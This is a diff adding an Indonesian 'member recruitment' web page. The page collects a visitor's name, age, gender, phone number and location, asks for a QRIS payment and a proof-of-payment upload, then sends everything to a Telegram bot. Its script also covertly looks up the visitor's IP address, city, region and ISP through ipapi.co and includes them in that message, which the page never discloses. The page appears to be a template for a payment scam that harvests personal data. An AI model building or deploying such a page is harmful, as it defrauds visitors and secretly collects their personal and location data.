@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Rekrutmen Anggota</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+  <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+  <style>
+    body { font-family: 'Arial', sans-serif; background-color: #000; color: #fff; }
+    .fade-in { opacity: 0; transition: opacity 1s ease-in; }
+    .fade-in.visible { opacity: 1; }
+    input, select { background-color: #374151; color: #fff; border: 1px solid #4b5563; }
+    input:focus, select:focus { outline: none; border-color: #2563eb; }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col">
+  <header class="bg-gray-900 text-white py-4 text-center" data-aos="fade-down">
+    <img src="https://i.ibb.co.com/qLZ7W9MT/Picsart-25-04-18-21-54-28-031.png" alt="Logo" class="mx-auto mb-4">
+    <h1 class="text-3xl font-bold">Rekrutmen Anggota Baru</h1>
+  </header>
+
+  <main class="flex-grow max-w-4xl mx-auto p-6">
+    <section id="welcome-section" class="bg-gray-800 p-8 rounded-lg shadow-lg text-center" data-aos="fade-up">
+      <h2 class="text-3xl font-semibold mb-4">Selamat Datang!</h2>
+      <p class="mb-6 text-lg">Bergabunglah dengan komunitas kami untuk menjadi bagian dari perubahan positif. Daftar sekarang dan mulailah perjalanan Anda bersama kami!</p>
+      <button id="to-form" class="bg-blue-600 text-white py-2 px-6 rounded-md hover:bg-blue-700">Daftar Sekarang</button>
+    </section>
+
+    <section id="form-section" class="bg-gray-800 p-6 rounded-lg shadow-lg hidden" data-aos="fade-up">
+      <h2 class="text-2xl font-semibold mb-4">Formulir Pendaftaran</h2>
+      <form id="registration-form" class="space-y-4">
+        <div><label for="nama" class="block text-sm font-medium">Nama Lengkap</label>
+          <input type="text" id="nama" name="nama" required class="mt-1 w-full p-2 rounded-md"></div>
+        <div><label for="umur" class="block text-sm font-medium">Umur</label>
+          <input type="number" id="umur" name="umur" min="1" required class="mt-1 w-full p-2 rounded-md"></div>
+        <div><label for="jenis_kelamin" class="block text-sm font-medium">Jenis Kelamin</label>
+          <select id="jenis_kelamin" name="jenis_kelamin" required class="mt-1 w-full p-2 rounded-md">
+            <option value="">Pilih</option>
+            <option value="Laki-laki">Laki-laki</option>
+            <option value="Perempuan">Perempuan</option>
+          </select></div>
+        <div><label for="nomor_ponsel" class="block text-sm font-medium">Nomor Ponsel</label>
+          <input type="tel" id="nomor_ponsel" name="nomor_ponsel" pattern="[0-9]{10,13}" required class="mt-1 w-full p-2 rounded-md" placeholder="081234567890"></div>
+        <div><label for="lokasi" class="block text-sm font-medium">Lokasi</label>
+          <input type="text" id="lokasi" name="lokasi" required class ="mt-1 w-full p-2 rounded-md"></div>
+        <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded-md hover:bg-blue-700">Lanjut ke Pembayaran</button>
+      </form>
+    </section>
+
+    <section id="payment-section" class="bg-gray-800 p-6 rounded-lg shadow-lg hidden" data-aos="fade-up">
+      <h2 class="text-2xl font-semibold mb-4">Pembayaran via QRIS</h2>
+      <p class="mb-4">Silakan scan kode QR di bawah ini untuk melakukan pembayaran.</p>
+      <img src="https://via.placeholder.com/200x200?text=QRIS" alt="QRIS Code" class="mx-auto mb-4">
+      <div>
+        <label for="bukti_pembayaran" class="block text-sm font-medium">Upload Bukti Pembayaran</label>
+        <input type="file" id="bukti_pembayaran" name="bukti_pembayaran" accept="image/*" required class="mt-1 w-full p-2 rounded-md">
+      </div>
+      <button id="submit-payment" class="w-full bg-blue-600 text-white py-2 rounded-md hover:bg-blue-700 mt-4">Kirim Bukti Pembayaran</button>
+    </section>
+
+    <section id="about-section" class="bg-gray-800 p-6 rounded-lg shadow-lg mt-6" data-aos="fade-up">
+      <h2 class="text-2xl font-semibold mb-4">Tentang Kami</h2>
+      <p class="mb-4">Kami adalah komunitas yang berkomitmen untuk menciptakan perubahan positif di masyarakat.</p>
+      <h3 class="text-lg font-semibold">Dukungan</h3>
+      <p class="mb-4">Hubungi kami di <a href="mailto:support@rekrutmenanggota.com" class="text-blue-400">support@rekrutmenanggota.com</a>.</p>
+    </section>
+  </main>
+
+  <footer class="bg-gray-900 text-white py-4 text-center">
+    <p>© 2025 Rekrutmen Anggota. All rights reserved.</p>
+  </footer>
+
+  <script>
+    AOS.init();
+    document.addEventListener('DOMContentLoaded', () => {
+      document.querySelectorAll('.fade-in').forEach(el => el.classList.add('visible'));
+    });
+
+    document.getElementById('to-form').addEventListener('click', () => {
+      document.getElementById('welcome-section').classList.add('hidden');
+      document.getElementById('form-section').classList.remove('hidden');
+    });
+
+    const form = document.getElementById('registration-form');
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const formData = new FormData(form);
+      const data = {
+        nama: formData.get('nama').trim(),
+        umur: parseInt(formData.get('umur')),
+        jenis_kelamin: formData.get('jenis_kelamin'),
+        nomor_ponsel: formData.get('nomor_ponsel').trim(),
+        lokasi: formData.get('lokasi').trim(),
+        waktu: new Date().toLocaleString()
+      };
+      if (data.umur <= 0) return alert('Umur harus lebih dari 0.');
+      if (!/^[0-9]{10,13}$/.test(data.nomor_ponsel)) return alert('Nomor ponsel tidak valid.');
+      localStorage.setItem('registrationData', JSON.stringify(data));
+      document.getElementById('form-section').classList.add('hidden');
+      document.getElementById('payment-section').classList.remove('hidden');
+    });
+
+    async function getIPAndLocation() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        return await res.json();
+      } catch (e) {
+        return { ip: 'Unknown', city: '-', region: '-', country_name: '-', org: '-' };
+      }
+    }
+
+    document.getElementById('submit-payment').addEventListener('click', async () => {
+      const fileInput = document.getElementById('bukti_pembayaran');
+      const file = fileInput.files[0];
+      const registrationData = JSON.parse(localStorage.getItem('registrationData'));
+      if (!file) return alert('Unggah bukti pembayaran.');
+      if (!registrationData) return alert('Data tidak ditemukan, isi ulang formulir.');
+      if (file.size > 5 * 1024 * 1024) return alert('Ukuran file maksimal 5MB.');
+
+      const locationData = await getIPAndLocation();
+
+      const caption = `PENDAFTARAN BARU:
+Nama: ${registrationData.nama}
+Umur: ${registrationData.umur}
+Jenis Kelamin: ${registrationData.jenis_kelamin}
+Nomor: ${registrationData.nomor_ponsel}
+Lokasi: ${registrationData.lokasi}
+Waktu: ${registrationData.waktu}
+IP: ${locationData.ip}
+Kota: ${locationData.city}
+Provinsi: ${locationData.region}
+Negara: ${locationData.country_name}
+ISP: ${locationData.org}`;
+
+      const tgData = new FormData();
+      tgData.append('chat_id', 'CHAT_ID'); // Ganti CHAT_ID
+      tgData.append('caption', caption);
+      tgData.append('photo', file);
+
+      try {
+        const res = await fetch('https://api.telegram.org/botBOT_TOKEN/sendPhoto', { // Ganti BOT_TOKEN
+          method: 'POST',
+          body: tgData
+        });
+        if (res.ok) {
+          alert('Data berhasil dikirim!');
+          localStorage.removeItem('registrationData');
+          window.location.reload();
+        } else {
+          const err = await res.json();
+          alert('Gagal: ' + err.description);
+        }
+      } catch (err) {
+        alert('Kesalahan jaringan.');
+      }
+    });
+  </script>
+</body>
+</html>
